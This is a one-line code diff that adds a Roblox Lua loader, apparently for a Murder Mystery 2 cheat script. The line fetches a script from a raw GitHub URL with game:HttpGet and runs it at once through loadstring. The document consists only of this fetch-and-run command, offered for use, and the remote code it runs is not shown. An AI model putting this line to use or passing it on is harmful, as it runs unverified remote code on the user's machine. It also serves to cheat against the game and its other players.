@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zzzhub079-ux/mm2-script2/refs/heads/main/mm2-script2"))()
